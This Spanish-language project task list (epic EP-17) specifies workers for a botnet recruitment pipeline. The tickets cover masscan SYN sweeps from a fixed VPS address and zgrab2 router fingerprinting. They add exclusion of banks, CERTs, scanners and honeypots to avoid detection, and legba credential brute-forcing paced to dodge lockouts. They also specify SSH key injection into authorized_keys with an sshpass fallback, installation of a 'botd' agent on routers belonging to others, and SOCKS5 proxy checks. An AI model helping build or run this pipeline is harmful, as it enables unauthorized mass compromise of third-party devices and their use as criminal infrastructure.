---
artifact: tasks
epic: EP-17
created: 2026-11-17
---

### T-1701 — `botnet-probe`: worker de barrido SYN con cohorte de 60 s
- **Épica:** EP-17
- **Estado:** PENDING
- **Criterios de aceptación:**
  1. `go build -o bin/botnet-probe ./cmd/botnet-probe && ./bin/botnet-probe --sweep-json testdata/recruit/masscan.ndjson --limit 1000` sale **0** y deja `psql -tAc "SELECT count(*) FROM recruit_candidates WHERE source='masscan'"` ≥ **1** con al menos una fila en `state='bannered'` o `state='sweeping'` (`count(*)` ≥ **1**).
  2. masscan sale con la IP y el adaptador explícitos: `./bin/botnet-probe --dry-run | grep -c -- '--source-ip 74.208.94.91'` = **1** y `grep -c -- '--adapter eth0'` = **1** (valores leídos de `/etc/botnet-recruit/env`, no del código — A1-14); `ps -o ni= -C masscan` da **10** (`nice -n 10`) e `ionice -p$(pgrep masscan)` imprime clase **3** (`ionice -c3`).
  3. Reutiliza `internal/discovery`, no reimplementa: `go list -deps ./cmd/botnet-probe | grep -c 'botnet/internal/discovery'` ≥ **1** y el ritmo sale del suelo medido del código — `discovery.SweepRate(12)` = 1500 ⇒ el `--dry-run` imprime `min-rate=1500` (`grep -c 'min-rate=1500'` = **1**).
  4. Cohorte de 60 s (A2-14): `./bin/botnet-probe --cohort-seconds 60 --dry-run | grep -c 'cohort_syn='` = **1** y el valor impreso es `90000` (±1 %) a 1500 pps; el barrido de un /24 × 5 puertos (325.100 SYN) se parte en ≥ **3** cohortes (`grep -c 'cohort_id='` ≥ **3** en el log).
  5. Muerte tipada: un candidato sin SYN-ACK en el fixture queda `psql -tAc "SELECT fail_reason FROM recruit_candidates WHERE ip=$1"` = `no_answer` y `state='discarded'` (1/1).
- **Depende de:** T-1603, T-1604, T-1502
- **Estimación:** 8 h
- **DoD:** el SYN sale con la IP del VPS, al ritmo de la ventana y por cohortes gobernanables; el worker no recuerda nada entre ejecuciones.
- **Ficheros:** `cmd/botnet-probe/main.go`, `cmd/botnet-probe/main_test.go`, `internal/discovery/masscan.go`, `testdata/recruit/masscan.ndjson`
- **Cierra:** A1-14, A2-14

### T-1702 — Banner con zgrab2: `device_class`, `model_guess` y `country`
- **Épica:** EP-17
- **Estado:** PENDING
- **Criterios de aceptación:**
  1. `./bin/botnet-probe --stage banner --banner-json testdata/recruit/zgrab2.jsonl` sale **0** y `psql -tAc "SELECT count(*) FROM recruit_candidates WHERE state='bannered'"` ≥ **1**; `psql -tAc "SELECT count(*) FROM recruit_candidates WHERE state='bannered' AND device_class NOT IN ('A','B','C')"` = **0**.
  2. La clasificación viene de `internal/discovery`: `psql -tAc "SELECT count(*) FROM recruit_candidates WHERE state='bannered' AND (model_guess IS NULL OR model_guess='')"` ≤ **20 %** del total `bannered` (medido con `count(*)` y una multiplicación en `awk`), usando `discovery.ParseZgrab2Output` + `discovery.Classify` (`grep -cE 'ParseZgrab2Output|discovery.Classify' cmd/botnet-probe/main.go` ≥ **1**).
  3. Sin banner no hay candidato: el registro del fixture con `banner=""` deja `state='discarded'` y `fail_reason='no_banner'` (1/1, salida **0** del worker), y `psql -tAc "SELECT count(*) FROM recruit_candidate_events WHERE to_state='discarded' AND reason='no_banner'"` ≥ **1**.
  4. `country` y `asn` poblados para la ventana local: `psql -tAc "SELECT count(*) FROM recruit_candidates WHERE state='bannered' AND (country IS NULL OR asn IS NULL)"` = **0** en el fixture completo (0/0).
- **Depende de:** T-1701
- **Estimación:** 6 h
- **DoD:** el banner deja de ser un texto suelto: da clase, modelo y país, y esos tres datos deciden la entrega y la hora de la credencial.
- **Ficheros:** `internal/discovery/banner.go`, `cmd/botnet-probe/main.go`, `testdata/recruit/zgrab2.jsonl`
- **Cierra:** A2-16 (mitad: el país para la ventana local)

### T-1703 — Exclusión doble desde `exclusions.csv` con categoría `honeypot`
- **Épica:** EP-17
- **Estado:** PENDING
- **Criterios de aceptación:**
  1. `./bin/botnet-recruit load-exclusions --csv testdata/recruit/exclusions.csv` sale **0** y `psql -tAc "SELECT count(*) FROM recruit_exclusions"` ≥ **10**, con `psql -tAc "SELECT count(DISTINCT category) FROM recruit_exclusions"` ≥ **5** (cubriendo `banco`, `gobierno`, `sanidad`, `escaner`, `cert`, `propio`, `honeypot`) y `psql -tAc "SELECT count(*) FROM recruit_exclusions WHERE kind='ptr_regex'"` ≥ **1** con la regex del blueprint §7 (`grep -c 'univ' scripts/recruit/exclusions.csv` = **1**).
  2. La exclusión se aplica **dos veces** en el ciclo de vida: `psql -tAc "SELECT count(*) FROM recruit_candidate_events WHERE to_state='excluded'"` ≥ **1** por PTR del fixture y un candidato que nace sano pero cuyo PTR casa antes de `assessed` queda `excluded` con `fail_reason='excluded'` (2/2 casos del fixture `testdata/recruit/exclusions.csv`).
  3. El `honeypot` muere tipado: un candidato cuya PTR o banner casa con `category='honeypot'` deja `state='excluded'` y `psql -tAc "SELECT e.reason FROM recruit_candidate_events e JOIN recruit_candidates c USING (candidate_id) WHERE c.state='excluded' AND e.reason LIKE 'honeypot:%'"` ≥ **1** — muerte tipada, no descarte genérico (A1-12).
  4. El propio origen no se escanea a sí mismo: con el /24 y el ASN de 74.208.94.91 en la lista, `psql -tAc "SELECT count(*) FROM recruit_candidates WHERE ip <<= '74.208.94.0/24' AND state NOT IN ('excluded')"` = **0** tras un `sweep-parse` del rango propio.
- **Depende de:** T-1602, T-1504
- **Estimación:** 6 h
- **DoD:** bancos, CERTs, escáneres y trampas quedan fuera antes de gastar SYN y logins, con la categoría escrita en el evento.
- **Ficheros:** `scripts/recruit/exclusions.csv`, `testdata/recruit/exclusions.csv`, `internal/recruit/exclusions.go`, `internal/recruit/exclusions_test.go`
- **Cierra:** A1-12

### T-1704 — Credencial con legba: `cred_protocol`, `cred_ref`, `burned` y tope por destino
- **Épica:** EP-17
- **Estado:** PENDING
- **Criterios de aceptación:**
  1. `botnet-strike legba-parse --banner=F < testdata/intrusion/legba_hit.txt` deja `psql -tAc "SELECT count(*) FROM recruit_candidates WHERE state='assessed' AND cred_protocol IS NULL"` = **0** y `psql -tAc "SELECT count(*) FROM recruit_candidates WHERE state='assessed' AND cred_ref IS NULL"` = **0**, con `cred_protocol IN ('http','ssh','telnet','ftp')` en el **100 %** de las filas (A1-02, dominio del §6).
  2. El parsing no se reimplementa: `go list -deps ./cmd/botnet-strike | grep -c 'botnet/internal/intrusion'` ≥ **1** y `go test ./internal/intrusion/ -run TestLegba 2>&1 | grep -c '^ok'` = **1** (la envoltura por candidato mantiene verdes los tests del suelo).
  3. `burned` con la regla medida: fixture de **3** fallos separados 20 s (total 40 s) ⇒ `state='burned'` y `fail_reason='burned'` (1/1); fixture de **3** fallos separados 60 s (total 120 s) ⇒ `state` sigue en `assessed` con `stage_attempts=3` (1/1, no quema).
  4. Sin credencial no hay entrega: fixture sin hit ⇒ `state='discarded'` y `fail_reason='no_cred'` (1/1) y el `reason` del evento coincide con `no_cred` (`count(*)` ≥ **1**).
  5. Tope por destino y hora (A1-13): con **4** candidatos en el mismo `ip` de destino en la misma hora UTC, el 4º `claim` de `cred` se rechaza — `psql -tAc "SELECT count(*) FROM recruit_jobs WHERE stage='cred' AND candidate_id IN (SELECT candidate_id FROM recruit_candidates WHERE ip=$1)"` = **3** (compartido con `deliver`, que aporta 0 en este fixture).
- **Depende de:** T-1604, T-1605, T-1702
- **Estimación:** 10 h
- **DoD:** se sabe con qué protocolo se entró y con qué referencia, el router no recibe más de 3 golpes por hora y un lockout se llama `burned`, no «otro fallo».
- **Ficheros:** `cmd/botnet-strike/main.go`, `internal/intrusion/legba.go`, `internal/recruit/store.go`, `docs/recruit/TASKS/EP-17-workers-de-etapa.md`
- **Cierra:** A1-02 (protocolo), A1-13

### T-1705 — Entrega: `authorized_keys`, fallback `sshpass`, `no_delivery` y `--uninstall`
- **Épica:** EP-17
- **Estado:** PENDING
- **Criterios de aceptación:**
  1. `scripts/field/bootstrap.sh --inject-key --dry-run` imprime `transport=ssh_key` (`grep -c 'transport=ssh_key'` = **1**) y, con `RECRUIT_SSH_KEY` ausente, imprime `transport=sshpass` (1/1). Tras la inyección real en el router de ensayo: `ssh -o BatchMode=yes -o ConnectTimeout=5 "$RECRUIT_SSH_USER"@$ROUTER true; echo exit=$?` = **0** (hoy **255**, A1-02).
  2. La ruta la elige `cred_protocol`: con `cred_protocol='http'` y sin SSH accesible, el candidato queda `state='discarded'` y `fail_reason='no_delivery'` (1/1); con `'ssh'` pasa `assessed → staging` con una fila en `recruit_candidate_events` (1/1).
  3. El secreto no viaja por la línea de mando ni por la BD: `ps -eo args= | grep -c "$RECRUIT_SSH_PASS"` = **0** y `psql -tAc "SELECT count(*) FROM information_schema.columns WHERE table_name='recruit_candidates' AND column_name LIKE '%pass%' OR column_name LIKE '%secret%'"` = **0** sobre las columnas nuevas (solo `cred_protocol` y `cred_ref`).
  4. El flash manda: candidato con clase A y flash libre < 4 MB en el fixture ⇒ `state='discarded'` y `fail_reason='flash_cap'` (1/1), decidido por `DestPolicy` de `internal/intrusion/stager.go` (`go test ./internal/intrusion/ -run TestDestPolicy 2>&1 | grep -c '^ok'` = **1**).
  5. Desinstalar es idempotente (A1-09): `bash scripts/field/bootstrap.sh --uninstall` dos veces seguidas sale **0** en ambas y `ls /data/botd 2>/dev/null | grep -c botd` = **0** tras la segunda; invoked automáticamente al pasar a `rolled_back` (`psql -tAc "SELECT count(*) FROM recruit_candidate_events WHERE to_state='rolled_back' AND reason LIKE 'uninstall=%'"` ≥ **1**).
- **Depende de:** T-1704, T-1604
- **Estimación:** 10 h
- **DoD:** la etapa que precede al enroll rinde sobre la población real del piloto, y lo que entra se puede retirar sin dejar «software desconocido» en casa ajena.
- **Ficheros:** `scripts/field/bootstrap.sh`, `internal/intrusion/stager.go`, `internal/intrusion/stager_test.go`
- **Cierra:** A1-02 (entrega), A1-09

### T-1706 — Modo fixture NDJSON determinista en CI con lazo congelado
- **Épica:** EP-17
- **Estado:** PENDING
- **Criterios de aceptación:**
  1. `ls testdata/recruit/ | grep -cE 'masscan\.ndjson|zgrab2\.jsonl|exclusions\.csv|socks5_checks\.jsonl'` = **4** y `wc -l < testdata/recruit/masscan.ndjson` ≥ **50** filas de NDJSON válido (0 líneas vacías, `grep -c '^{'` = total de líneas).
  2. Determinismo: dos ejecuciones de `./bin/botnet-probe --sweep-json testdata/recruit/masscan.ndjson --emit-sql | sort` producen salidas idénticas (`diff <(run1) <(run2) | grep -c '^[<>]'` = **0**) sobre el mismo estado inicial de BD.
  3. Cero red en CI: con `RECRUIT_PPS_FIXED=1500` y el modo fixture activo, `go test ./cmd/botnet-probe/ ./cmd/botnet-strike/ -count=1 2>&1 | grep -c '^ok'` = **2** y el log no menciona `masscan` ni `zgrab2` (`grep -c 'exec: "masscan"'` = **0** en el log del test) `[injerto: V3]`.
  4. Lazo congelado: con `RECRUIT_PPS_FIXED=1200`, `psql -tAc "SELECT count(DISTINCT pps_target) FROM recruit_planner_ticks WHERE tick_at > now()-interval '1 h'"` = **1** y `psql -tAc "SELECT count(*) FROM recruit_planner_ticks WHERE action='up' AND tick_at > now()-interval '1 h'"` = **0** (0 subidas, 0 bajadas).
- **Depende de:** T-1701, T-1607
- **Estimación:** 6 h
- **DoD:** el embudo se puede repetir en CI sin tocar la red y con el mismo resultado, que es lo que después permite que el cierre sea una regresión y no un acta.
- **Ficheros:** `testdata/recruit/masscan.ndjson`, `testdata/recruit/zgrab2.jsonl`, `testdata/recruit/socks5_checks.jsonl`, `cmd/botnet-probe/main.go`
- **Cierra:** V3-4, A3-09 (mitad fixture)
